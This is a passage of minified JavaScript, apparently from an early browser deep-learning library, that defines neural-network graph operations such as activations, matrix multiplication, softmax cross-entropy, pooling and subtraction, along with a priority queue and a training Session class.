p=t.neg(s),d=t.elementWiseMul(c,p);h?n.add(r.x2Tensor,t.sum(d)):n.add(r.x2Tensor,d)}}))},e}(t("./op").Operation);n.Divide=u},{"../../globals":28,"../../util":143,"../graph_util":34,"./op":51}],43:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=t("../activation_functions"),a=t("./op"),u=function(t){function e(e,n,r){var i=t.call(this)||this;return i.xTensor=e,i.yTensor=n,i.func=r,i}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.xTensor);o.tidy((function(){e.set(n.yTensor,o.keep(n.func.output(t,r)))}))},e.prototype.backProp=function(t,e,n){var r=this,i=e.get(this.xTensor),s=e.get(this.yTensor),a=n.get(this.yTensor);o.tidy((function(){var e=r.func.der(t,i,s);n.add(r.xTensor,t.elementWiseMul(a,e)),e.dispose()}))},e.prototype.dispose=function(){this.func.dispose()},e}(a.Operation);n.ElementWiseActivation=u;var c=function(t){function e(e,n){return t.call(this,e,n,new s.ReLUFunc)||this}return i(e,t),e}(u);n.ReLU=c;var l=function(t){function e(e,n,r){return t.call(this,e,n,new s.LeakyReluFunc(r))||this}return i(e,t),e}(u);n.LeakyReLU=l;var h=function(t){function e(e,n){return t.call(this,e,n,new s.TanHFunc)||this}return i(e,t),e}(u);n.TanH=h;var p=function(t){function e(e,n){return t.call(this,e,n,new s.SigmoidFunc)||this}return i(e,t),e}(u);n.Sigmoid=p;var d=function(t){function e(e,n){return t.call(this,e,n,new s.SquareFunc)||this}return i(e,t),e}(u);n.Square=d;var f=function(t){function e(e,n){return t.call(this,e,n,new s.EluFunc)||this}return i(e,t),e}(u);n.Elu=f;var y=function(t){function e(e,n,r){var i=t.call(this)||this;return i.xTensor=e,i.alphaTensor=n,i.yTensor=r,i}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.xTensor),i=e.get(this.alphaTensor);o.tidy((function(){e.set(n.yTensor,o.keep(t.prelu(r,i)))}))},e.prototype.backProp=function(t,e,n){throw new Error("Not implemented")},e}(a.Operation);n.PReLU=y},{"../../globals":28,"../activation_functions":30,"./op":51}],44:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../environment"),s=t("../../globals"),a=t("../../tensor"),u=t("../../util"),c=t("../cost_functions"),l=t("../graph_util"),h=function(t){function e(e,n,r,i){var s=t.call(this)||this;return s.x1Tensor=e,s.x2Tensor=n,s.yTensor=r,s.func=i,s.oneOverNScalar=o.ENV.math.keep(a.Scalar.new(1/u.sizeFromShape(e.shape))),s}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.x1Tensor),i=e.get(this.x2Tensor);s.tidy((function(){var o=n.func.cost(r,i),a=t.sum(o),u=t.scalarTimesArray(n.oneOverNScalar,a);e.set(n.yTensor,s.keep(u))}))},e.prototype.backProp=function(t,e,n){var r=this,i=e.get(this.x1Tensor),o=e.get(this.x2Tensor);s.tidy((function(){l.shouldBackProp(r.x1Tensor)&&n.add(r.x1Tensor,r.func.der(i,o)),l.shouldBackProp(r.x2Tensor)&&n.add(r.x2Tensor,r.func.der(o,i))}))},e.prototype.dispose=function(){this.func.dispose(),this.oneOverNScalar.dispose()},e}(t("./op").Operation);n.ElementWiseCost=h;var p=function(t){function e(e,n,r){return t.call(this,e,n,r,new c.SquareCostFunc)||this}return i(e,t),e}(h);n.MeanSquaredCost=p},{"../../environment":27,"../../globals":28,"../../tensor":137,"../../util":143,"../cost_functions":31,"../graph_util":34,"./op":51}],45:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=t("../graph_util"),a=function(t){function e(e,n){var r=t.call(this)||this;return r.xTensor=e,r.yTensor=n,r}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.xTensor);o.tidy((function(){e.set(n.yTensor,o.keep(t.exp(r)))}))},e.prototype.backProp=function(t,e,n){var r=this,i=e.get(this.yTensor),a=n.get(this.yTensor);o.tidy((function(){s.shouldBackProp(r.xTensor)&&n.add(r.xTensor,t.elementWiseMul(i,a))}))},e}(t("./op").Operation);n.Exp=a},{"../../globals":28,"../graph_util":34,"./op":51}],46:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=t("../graph_util"),a=function(t){function e(e,n,r,i,o){var s=t.call(this)||this;return s.x1Tensor=e,s.x2Tensor=n,s.c1Tensor=r,s.c2Tensor=i,s.outTensor=o,s}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.x1Tensor),i=e.get(this.x2Tensor),s=e.get(this.c1Tensor).asScalar(),a=e.get(this.c2Tensor).asScalar();o.tidy((function(){e.set(n.outTensor,o.keep(t.scaledArrayAdd(s,r,a,i)))}))},e.prototype.backProp=function(t,e,n){var r=this,i=e.get(this.x1Tensor),a=e.get(this.x2Tensor),u=e.get(this.c1Tensor),c=e.get(this.c2Tensor),l=n.get(this.outTensor);o.tidy((function(){if(s.shouldBackProp(r.x1Tensor)&&n.add(r.x1Tensor,t.scalarTimesArray(u,l)),s.shouldBackProp(r.x2Tensor)&&n.add(r.x2Tensor,t.scalarTimesArray(c,l)),s.shouldBackProp(r.c1Tensor)){var e=t.elementWiseMul(i,l);n.add(r.c1Tensor,t.sum(e))}if(s.shouldBackProp(r.c2Tensor)){var o=t.elementWiseMul(a,l);n.add(r.c2Tensor,t.sum(o))}}))},e}(t("./op").Operation);n.LinearCombination=a},{"../../globals":28,"../graph_util":34,"./op":51}],47:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=t("../graph_util"),a=function(t){function e(e,n){var r=t.call(this)||this;return r.xTensor=e,r.yTensor=n,r}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.xTensor);o.tidy((function(){e.set(n.yTensor,o.keep(t.log(r)))}))},e.prototype.backProp=function(t,e,n){var r=this,i=e.get(this.xTensor),a=n.get(this.yTensor);o.tidy((function(){s.shouldBackProp(r.xTensor)&&n.add(r.xTensor,t.divide(a,i))}))},e}(t("./op").Operation);n.Log=a},{"../../globals":28,"../graph_util":34,"./op":51}],48:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=t("../graph_util"),a=function(t){function e(e,n,r){var i=t.call(this)||this;return i.x1Tensor=e,i.x2Tensor=n,i.yTensor=r,i}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.x1Tensor),i=e.get(this.x2Tensor);o.tidy((function(){2===r.shape.length&&2===i.shape.length?e.set(n.yTensor,o.keep(t.matMul(r,i))):2===r.shape.length&&1===i.shape.length?e.set(n.yTensor,o.keep(t.matrixTimesVector(r,i))):1===r.shape.length&&2===i.shape.length&&e.set(n.yTensor,o.keep(t.vectorTimesMatrix(r,i)))}))},e.prototype.backProp=function(t,e,n){var r=this,i=e.get(this.x1Tensor),a=e.get(this.x2Tensor),u=n.get(this.yTensor);1===i.shape.length&&(i=i.reshape([1,i.size]),u=u.reshape([1,u.size])),1===a.shape.length&&(a=a.reshape([a.size,1]),u=u.reshape([u.size,1])),o.tidy((function(){if(s.shouldBackProp(r.x1Tensor)){var e=t.matMul(u,a,!1,!0);n.add(r.x1Tensor,1===r.x1Tensor.shape.length?e.as1D():e)}if(s.shouldBackProp(r.x2Tensor)){var o=t.matMul(i,u,!0,!1);n.add(r.x2Tensor,1===r.x2Tensor.shape.length?o.as1D():o)}}))},e}(t("./op").Operation);n.MatMul=a},{"../../globals":28,"../graph_util":34,"./op":51}],49:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=t("../../ops/conv_util"),a=t("../../util"),u=function(t){function e(e,n,r,i,o){void 0===i&&(i=1);var u=t.call(this)||this;return u.xTensor=e,u.yTensor=n,u.fieldSize=r,u.stride=i,u.pad=null!=o?o:s.computeDefaultPad(e.shape,u.fieldSize,u.stride),a.assert(a.isInt(u.pad),"The zero padding ("+u.pad+") must be an integer. Change the stride and/or zero pad parameters"),u}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.xTensor);o.tidy((function(){e.set(n.yTensor,o.keep(t.maxPool(r,n.fieldSize,n.stride,n.pad)))}))},e.prototype.backProp=function(t,e,n){var r=this,i=e.get(this.xTensor),s=n.get(this.yTensor);o.tidy((function(){n.add(r.xTensor,t.maxPoolBackprop(s,i,r.fieldSize,r.stride,r.pad))}))},e}(t("./op").Operation);n.MaxPool=u},{"../../globals":28,"../../ops/conv_util":106,"../../util":143,"./op":51}],50:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=t("../../util"),a=t("../graph_util"),u=function(t){function e(e,n,r){var i=t.call(this)||this;return i.x1Tensor=e,i.x2Tensor=n,i.yTensor=r,s.assert(1===s.sizeFromShape(e.shape)||1===s.sizeFromShape(n.shape)||s.arraysEqual(e.shape,n.shape),"One of t1 or t2 must be a scalar, or t1 and t2 must have the same shape"),i}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.x1Tensor),i=e.get(this.x2Tensor);o.tidy((function(){var a;a=s.isScalarShape(r.shape)?t.scalarTimesArray(r,i):s.isScalarShape(i.shape)?t.scalarTimesArray(i,r):t.elementWiseMul(r,i),e.set(n.yTensor,o.keep(a))}))},e.prototype.backProp=function(t,e,n){var r=this,i=e.get(this.x1Tensor),u=e.get(this.x2Tensor),c=n.get(this.yTensor);o.tidy((function(){if(a.shouldBackProp(r.x1Tensor))if(s.isScalarShape(r.x1Tensor.shape)){var e=t.elementWiseMul(c,u);n.add(r.x1Tensor,t.sum(e))}else s.isScalarShape(u.shape)?n.add(r.x1Tensor,t.scalarTimesArray(u,c)):n.add(r.x1Tensor,t.elementWiseMul(u,c));if(a.shouldBackProp(r.x2Tensor))if(s.isScalarShape(r.x2Tensor.shape)){e=t.elementWiseMul(c,i);n.add(r.x2Tensor,t.sum(e))}else s.isScalarShape(i.shape)?n.add(r.x2Tensor,t.scalarTimesArray(i,c)):n.add(r.x2Tensor,t.elementWiseMul(i,c))}))},e}(t("./op").Operation);n.Multiply=u},{"../../globals":28,"../../util":143,"../graph_util":34,"./op":51}],51:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(){function t(){}return t.prototype.disposeTransientArrays=function(t,e){},t.prototype.dispose=function(){},t}();n.Operation=r},{}],52:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../environment"),s=t("../../globals"),a=t("../../tensor"),u=t("../../util"),c=t("../graph_util"),l=function(t){function e(e,n){var r=t.call(this)||this;return r.x=e,r.outTensor=n,u.assertShapesMatch(n.shape,[]),r.ones=o.ENV.math.keep(a.Tensor.ones(e.shape)),r}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.x);s.tidy((function(){e.set(n.outTensor,s.keep(t.sum(r)))}))},e.prototype.backProp=function(t,e,n){var r=this;c.shouldBackProp(this.x)&&s.tidy((function(){var e=n.get(r.outTensor);n.add(r.x,t.scalarTimesArray(e,r.ones))}))},e.prototype.dispose=function(){this.ones.dispose()},e}(t("./op").Operation);n.ReduceSum=l},{"../../environment":27,"../../globals":28,"../../tensor":137,"../../util":143,"../graph_util":34,"./op":51}],53:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=t("../../util"),a=function(t){function e(e,n){var r=t.call(this)||this;r.xTensor=e,r.yTensor=n;var i=s.sizeFromShape(e.shape),o=s.sizeFromShape(n.shape);return s.assert(i===o,"The input size ("+i+") and output size ("+o+") must match"),r}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.xTensor),i=t.clone(r);o.tidy((function(){e.set(n.yTensor,o.keep(i.reshape(n.yTensor.shape)))}))},e.prototype.backProp=function(t,e,n){var r=this,i=n.get(this.yTensor),s=t.clone(i);o.tidy((function(){n.add(r.xTensor,s.reshape(r.xTensor.shape))}))},e}(t("./op").Operation);n.Reshape=a},{"../../globals":28,"../../util":143,"./op":51}],54:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../environment"),s=t("../../globals"),a=t("../../tensor"),u=t("../../util"),c=t("../graph"),l=t("../graph_util"),h=t("./op"),p=function(t){function e(e,n){var r=t.call(this)||this;return r.logitsTensor=e,r.output=n,r}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.logitsTensor);return s.tidy((function(){e.set(n.output,s.keep(t.softmax(r)))}))},e.prototype.backProp=function(t,e,n){var r=this,i=e.get(this.output),o=n.get(this.output);s.tidy((function(){if(l.shouldBackProp(r.logitsTensor)){var e=t.elementWiseMul(t.subtract(o,t.sum(t.elementWiseMul(o,i))),i);n.add(r.logitsTensor,e)}}))},e}(h.Operation);n.Softmax=p;var d=function(t){function e(e,n,r){var i=t.call(this)||this;return i.logitsTensor=e,i.labelTensor=n,i.yTensor=r,i.softmaxTensor=new c.SymbolicTensor(e.shape),i.epsilon=o.ENV.math.keep(a.Scalar.new(1e-5)),i}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.logitsTensor),i=e.get(this.labelTensor);s.tidy((function(){var o=t.softmax(r);e.set(n.softmaxTensor,s.keep(o)),e.set(n.yTensor,s.keep(f(t,o,i,n.epsilon)))}))},e.prototype.backProp=function(t,e,n){var r=this,i=e.get(this.softmaxTensor),o=e.get(this.labelTensor);s.tidy((function(){n.add(r.logitsTensor,t.subtract(i,o))}))},e.prototype.disposeTransientArrays=function(t,e){t.disposeArray(this.softmaxTensor)},e.prototype.dispose=function(){this.epsilon.dispose()},e}(h.Operation);function f(t,e,n,r){return u.assert(e.size===n.size,"The output and target must be the same size"),s.tidy((function(){var i=t.scalarPlusArray(r,e),o=t.log(i),s=t.elementWiseMul(n,o),a=t.neg(s);return t.sum(a)}))}n.SoftmaxCrossEntropyCost=d,n.crossEntropyCost=f},{"../../environment":27,"../../globals":28,"../../tensor":137,"../../util":143,"../graph":32,"../graph_util":34,"./op":51}],55:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=t("../../util"),a=t("../graph_util"),u=function(t){function e(e,n,r){var i=t.call(this)||this;return i.t1=e,i.t2=n,i.outTensor=r,s.assert(1===s.sizeFromShape(e.shape)||1===s.sizeFromShape(n.shape)||s.arraysEqual(e.shape,n.shape),"One of t1 or t2 must be a scalar, or t1 and t2 must have the same shape"),i}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.t1),i=e.get(this.t2);o.tidy((function(){var a;a=s.isScalarShape(r.shape)?t.scalarMinusArray(r,i):s.isScalarShape(i.shape)?t.arrayMinusScalar(r,i):t.subtract(r,i),e.set(n.outTensor,o.keep(a))}))},e.prototype.backProp=function(t,e,n){var r=this,i=n.get(this.outTensor);o.tidy((function(){if(a.shouldBackProp(r.t1))if(s.isScalarShape(r.t1.shape)){var e=t.sum(i);n.add(r.t1,e)}else n.add(r.t1,t.clone(i));if(a.shouldBackProp(r.t2))if(s.isScalarShape(r.t2.shape)){e=t.sum(i);var o=t.neg(e);n.add(r.t2,o)}else n.add(r.t2,t.neg(i))}))},e.prototype.dispose=function(){null!=this.dySizeScalar&&this.dySizeScalar.dispose()},e}(t("./op").Operation);n.Subtract=u},{"../../globals":28,"../../util":143,"../graph_util":34,"./op":51}],56:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0}),n.defaultCompare=function(t,e){return t===e?0:t<e?-1:1};var r=function(){function t(t,e){this.comparator=t,this.indexObserver=e,this.heap=[]}return t.prototype.enqueue=function(t){this.heap.push(t),this.onIndexChanged(t,this.heap.length-1),this.siftUp(this.heap.length-1)},t.prototype.dequeue=function(){if(this.empty())throw new Error("dequeue called on empty priority queue.");var t=this.heap[0];return this.swap(0,this.heap.length-1),this.heap.pop(),this.siftDown(0),t},t.prototype.update=function(t,e){var n=e===this.heap.length-1;n||this.swap(e,this.heap.length-1),this.heap.pop(),n||(-1!==this.siftUpIndex(e)?this.siftUp(e):-1!==this.siftDownIndex(e)&&this.siftDown(e)),this.enqueue(t)},t.prototype.empty=function(){return 0===this.heap.length},t.prototype.onIndexChanged=function(t,e){this.indexObserver&&this.indexObserver(t,e)},t.prototype.getParentIndex=function(t){return 0===t?-1:Math.floor((t-1)/2)},t.prototype.getLeftChildIndex=function(t){var e=2*t+1;return e<this.heap.length?e:-1},t.prototype.getRightChildIndex=function(t){var e=2*t+2;return e<this.heap.length?e:-1},t.prototype.siftUpIndex=function(t){var e=this.getParentIndex(t);return-1===e?-1:this.compare(e,t)>0?e:-1},t.prototype.siftUp=function(t){for(var e=this.siftUpIndex(t);-1!==e;)this.swap(t,e),t=e,e=this.siftUpIndex(t)},t.prototype.siftDownIndex=function(t){if(t>=this.heap.length)return-1;var e=t,n=this.getLeftChildIndex(t);-1!==n&&this.compare(n,e)<0&&(e=n);var r=this.getRightChildIndex(t);return-1!==r&&this.compare(r,e)<0&&(e=r),e===t?-1:e},t.prototype.siftDown=function(t){for(var e=this.siftDownIndex(t);-1!==e;)this.swap(t,e),t=e,e=this.siftDownIndex(t)},t.prototype.compare=function(t,e){return this.comparator(this.heap[t],this.heap[e])},t.prototype.swap=function(t,e){var n=this.heap[t];this.heap[t]=this.heap[e],this.heap[e]=n,this.onIndexChanged(this.heap[t],t),this.onIndexChanged(this.heap[e],e)},t}();n.PriorityQueue=r},{}],57:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r,i=t("../globals"),o=t("../tensor"),s=t("../util"),a=t("./operation_emitter"),u=t("./session_util"),c=t("./tensor_array_map"),l=function(t){var e=this;this.dict={},t&&t.forEach((function(t){return e.dict[t.tensor.id]=t}))};n.FeedDictionary=l,function(t){t[t.NONE=0]="NONE",t[t.SUM=1]="SUM",t[t.MEAN=2]="MEAN"}(r=n.CostReduction||(n.CostReduction={}));var h=function(){function t(t,e){this.math=e,this.activationArrayMap=new c.TensorArrayMap,this.runtimeCache={},this.oneScalar=o.Scalar.new(1),this.gradientArrayMap=new c.SummedTensorArrayMap(this.math)}return t.prototype.dispose=function(){var t=this;this.activationArrayMap.dispose(),Object.keys(this.runtimeCache).forEach((function(e){var n=t.runtimeCache[e];n.operations&&n.operations.forEach((function(t){return t.dispose()}))})),this.runtimeCache={},null!=this.batchSizeScalar&&this.batchSizeScalar.dispose(),this.oneScalar.dispose()},t.prototype.evalAll=function(t,e){var n=this;return i.tidy((function(){var r=new l(e),i=n.getOrCreateRuntime(t,r),o=n.activationArrayMap;u.disposeAndInitializeOperationOutputs(i.nodes,o),u.disposeTransientOperationArrays(i.operations,n.activationArrayMap,n.gradientArrayMap),u.addPersistentArraysToTensorArrayMap(i.nodes,o),u.loadInputsFromFeedDictionaryToTensorArrayMap(r,o,n.math),i.operations.forEach((function(t){return t.feedForward(n.math,o)}));var s=t.map((function(t){return o.get(t)}));return t.forEach((function(t){return o.delete(t)})),u.releaseFeedDictionaryInputsFromTensorArrayMap(r,o,n.math),s}))},t.prototype.eval=function(t,e){return this.evalAll([t],e)[0]},t.prototype.train=function(t,e,n,a,c){var h=this;void 0===c&&(c=r.NONE),s.assert(s.isScalarShape(t.shape),"Cost tensor for training must be a scalar value."),this.prevBatchSize!==n&&(this.prevBatchSize=n,null!=this.batchSizeScalar&&this.batchSizeScalar.dispose(),this.batchSizeScalar=this.math.keep(o.Scalar.new(n)));var p=new l(e);u.throwIfFeedDictionaryContainsNDArrays(p);var d=this.getOrCreateRuntime([t],p),f=d.operations,y=d.operations.slice().reverse(),m=this.activationArrayMap,v=this.gradientArrayMap;return v.nullify(t),v.add(t,this.oneScalar),u.addPersistentArraysToTensorArrayMap(d.nodes,m),a.beforeBatch(this.math,n,d,m,v),i.tidy((function(){for(var e=o.Scalar.new(0),r=0;r<n;++r)u.disposeAndInitializeOperationOutputs(d.nodes,m),u.disposeAndInitializeOperationInputGradients(d.nodes,v),u.disposeTransientOperationArrays(d.operations,m,v),u.loadInputsFromFeedDictionaryToTensorArrayMap(p,m,h.math),f.forEach((function(t){return t.feedForward(h.math,m)})),y.forEach((function(t){return t.backProp(h.math,m,v)})),a.afterExample(h.math,d,m,v),u.releaseFeedDictionaryInputsFromTensorArrayMap(p,m,h.math),e=h.updateCostForExample(e,m.get(t),c);return a.afterBatch(h.math,n,d,m,v),h.updateCostForBatch(e,c)}))},t.prototype.updateCostForExample=function(t,e,n){return n===r.MEAN||n===r.SUM?this.math.add(t,e):t},t.prototype.updateCostForBatch=function(t,e){return e===r.MEAN?this.math.divide(t,this.batchSizeScalar):t},t.prototype.getOrCreateRuntime=function(t,e){var n=this.makeRuntimeCacheKey(t,e),r=this.runtimeCache[n];if(void 0===r){var i=u.getOrderedEvaluationSetFromEvalTensor(t,e);u.removeFeedDictionaryNodesFromEvaluationSet(e,i),u.throwErrorIfEvaluationSetContainsPlaceholderNodes(i),r={nodes:i,operations:a.emitFromGraphNodes(i)},this.runtimeCache[n]=r}return r},t.prototype.makeRuntimeCacheKey=function(t,e){return t.map((function(t){return t.id})).sort().join("_")+"__"+Object.keys(e.dict).sort().join("_")},t}();n.Session=h},{"../globals":28,"../tensor":137,"../util":143,"./operation_emitter":36,"./session_util":58,"./tensor_array_map":59}],58:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../tensor"),i=t("../util"),o=t("./graph"),s=t("./graph_util");function a(t){return Object.keys(t.dict).map((function(e){return t.dict[+e].tensor.node}))}n.getTerminatingNodesFromFeedDictionary=a,n.getOrderedEvaluationSetFromEvalTensor=function(t,e){var n=a(e),r=t.map((function(t){return t.node})),i=s.getUnorderedEvaluationSet(r,n);return s.getOrderedEvaluationSet(i)},n.addPersistentArraysToTensorArrayMap=function(t,e){t.forEach((function(t){(t instanceof o.VariableNode||t instanceof o.ConstantNode)&&e.set(t.output,t.data)}))},n.getVariableNodesFromEvaluationSet=function(t){var e=[];return t.forEach((function(t){t instanceof o.VariableNode&&e.push(t)})),e},n.throwIfFeedDictionaryContainsNDArrays=function(t){Object.keys(t.dict).forEach((function(e){if(t.dict[+e].data instanceof r.Tensor)throw new Error("training requires FeedDictionary entries to be InputProvidersand not NDArrays.")}))},n.loadInputsFromFeedDictionaryToTensorArrayMap=function(t,e,n){Object.keys(t.dict).forEach((function(n){var o,s=t.dict[+n];s.data instanceof r.Tensor?o=s.data:o=s.data.getNextCopy();i.assert(i.arraysEqual(s.tensor.shape,o.shape),"Error loading FeedEntry: feeding NDArray of shape "+o.shape+" does not match Tensor (id: "+s.tensor.id+") shape: "+s.tensor.shape+"."),e.set(s.tensor,o)}))},n.releaseFeedDictionaryInputsFromTensorArrayMap=function(t,e,n){Object.keys(t.dict).forEach((function(n){var i=t.dict[+n];if(!(i.data instanceof r.Tensor)){var o=i.data,s=e.get(i.tensor);o.disposeCopy(s)}e.delete(i.tensor)}))},n.removeFeedDictionaryNodesFromEvaluationSet=function(t,e){for(var n=0;n<e.length;){var r=e[n];null!=t.dict[r.output.id]?e.splice(n,1):++n}},n.disposeAndInitializeOperationOutputs=function(t,e){t.forEach((function(t){s.isInputNode(t)||(s.isPassthroughNode(t,e)||e.disposeArray(t.output),e.set(t.output,null))}))},n.disposeAndInitializeOperationInputGradients=function(t,e){t.forEach((function(t){Object.keys(t.inputs).forEach((function(n){var r=t.inputs[n];e.get(r,!0)!==e.get(t.output,!0)&&e.disposeArray(r),e.nullify(r)}))}))},n.disposeTransientOperationArrays=function(t,e,n){t.forEach((function(t){return t.disposeTransientArrays(e,n)}))},n.throwErrorIfEvaluationSetContainsPlaceholderNodes=function(t){t.forEach((function(t){if(t instanceof o.PlaceholderNode){var e="["+t.output.shape.join(", ")+"]";throw new Error('Placeholder node "'+t.name+'" '+e+" not present in feed dictionary.")}}))}},{"../tensor":137,"../util":143,"./graph":32,"./graph_util":34}],59:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=function(){function t(){this.dict={}}return t.prototype.get=function(t,e){if(void 0===e&&(e=!1),!e&&void 0===this.dict[t.id])throw new Error("tensor "+t.id+" not in array map.");var n=this.dict[t.id];if(!e&&null===n)throw new Error("tensor "+t.id+" has null array.");return n},t.prototype.delete=function(t){delete this.dict[t.id]},t.prototype.nullify=function(t){this.dict[t.id]=null},t.prototype.disposeArray=function(t){if(void 0!==this.dict[t.id]){var e=this.dict[t.id];null!==e&&(e.dispose(),this.dict[t.id]=null)}},t.prototype.size=function(){return Object.keys(this.dict).length},t.prototype.dispose=function(){var t=this;Object.keys(this.dict).forEach((function(e){var n=t.dict[+e];n&&n.dispose()})),this.dict={}},t.prototype.hasNullArray=function(t){if(void 0===this.dict[t.id])throw new Error("tensor "+t.id+" not in array map.");return null===this.dict[t.id]},t}();n.TensorArrayMapBase=o;var s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return i(e,t),e.prototype.set=function(t,e){this.dict[t.id]=e},e}(o);n.TensorArrayMap=s;var a=function(t){function e(e){var n=t.call(this)||this;return n.math=e,n}return i(e,t),e.prototype.add=function(t,e){if(null==this.dict[t.id])this.dict[t.id]=this.math.keep(e);else{var n=this.get(t),r=this.math.keep(this.math.addStrict(n,e));this.dict[t.id]=r,n.dispose()}},e}(o);n.SummedTensorArrayMap=a},{}],60:[function(t,e,n){"use strict";function r(t){for(var e in t)n.hasOwnProperty(e)||(n[e]=t[e])}Object.defineProperty(n,"__esModule",{value:!0});var i=t("./browser_util"),o=t("./contrib");n.contrib=o;var 